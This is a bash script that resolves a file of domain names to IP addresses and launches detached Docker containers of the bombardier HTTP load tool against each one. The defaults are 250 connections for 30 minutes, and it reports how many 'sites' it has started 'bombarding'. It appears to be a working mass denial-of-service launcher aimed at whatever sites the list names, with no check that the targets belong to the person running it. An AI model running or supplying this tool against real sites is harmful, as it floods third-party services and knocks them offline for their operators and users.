#!/bin/bash
source libs/*.sh

connections=250
duration=1800
domains_filename=domains.txt
ips_filename=ips.txt

function exit_successful {
	text=$1

	if ! [ -z text ]
	then
		echo_green "$text"
	fi

	exit 0
}

function exit_with_error {
	text=$1
	error_code=${2:-1}

	if ! [ -z text ]
	then
		echo_red "$text"
	fi

	exit $error_code
}

function parse_args {
	while [ : ]
	do
		OPT=$1
		OPTARG=$2

		if [ -z $OPT ]
		then
			break
		fi

		case $OPT in
			-d | --duration)
				duration=$OPTARG

				shift 2
				;;
			-df | --domains_file)
				domains_filename=$OPTARG

				shift 2
				;;
			-c | --connections)
				connections=$OPTARG

				shift 2
				;;
			-h | --help)
				echo_default "Usage: $(basename $0) [-d SECONDS] [-c CONNECTIONS] [-df FILENAME]"
				shift
				exit 0
				;;
			*)
				exit_with_error "Invalid2 arg '$OPT' given"
				;;
		esac
	done
}

function validate_args {
	re_isanum='^[0-9]+$'

	if ! { [[ $duration =~ $re_isanum ]] && [[ $duration -ge 1 ]]; }
	then
		echo_red "Duration should be a positive number greater than 0"
		exit 1
	fi

	if ! { [[ $connections =~ $re_isanum ]] && [[ $connections -ge 1 ]]; }
	then
		echo_red "Connections should be a positive number greater than 0"
		exit 1
	fi
}

function main {
	parse_args $@

	validate_args

	echo_default "Pulling Docker image"

	# validate docker is installed
	docker pull alpine/bombardier

	if [ $? -ne 0 ]
	then
		echo_red "Something went wrong while getting Docker image"
		exit 1
	fi

	echo_default "Domains file - $domains_filename"

	# generate ips file
	parse_dns_records_for_domains $domains_filename $ips_filename

	bombarding_count=0

	function cb {
		ip=$1
		url="http://$ip"

		docker run -d alpine/bombardier -c $connections -d "${duration}s" -l $url &>-
			
		if [ $? -ne 0 ]
		then
			continue
		fi

		echo_default "Started bombarding $url with $connections connections for $duration seconds"
		((bombarding_count++))
	}

	read_file $ips_filename cb

	exit_successful "Successfully started bombarding $bombarding_count sites!"
}

main $@
